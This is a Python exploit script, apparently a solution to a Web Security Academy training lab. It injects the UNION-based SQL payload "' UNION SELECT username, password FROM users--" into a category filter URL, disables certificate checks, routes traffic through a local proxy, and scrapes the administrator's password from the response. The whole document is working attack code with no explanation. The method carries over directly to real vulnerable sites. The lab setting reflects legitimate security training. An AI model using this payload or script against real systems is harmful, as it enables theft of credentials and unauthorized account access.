import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def get_userdata(url):
    username = 'administrator'
    payload = "' UNION SELECT username, password FROM users--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    if username in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            admin_passwd = soup.body.find(text="administrator").parent.find_next('td').contents[0]
        except:
            return False
        return admin_passwd
    return False

if __name__ == '__main__':
    url = 'https://acb71fda1f728316c0240ddb002900a4.web-security-academy.net/filter?category=Pets'
    print("Dumping all username and password")
    print("=================================")
    response = get_userdata(url)
    if response:
        print(f"administrator : {response}")
    else:
        print('[.] Failed SQLi')
        
    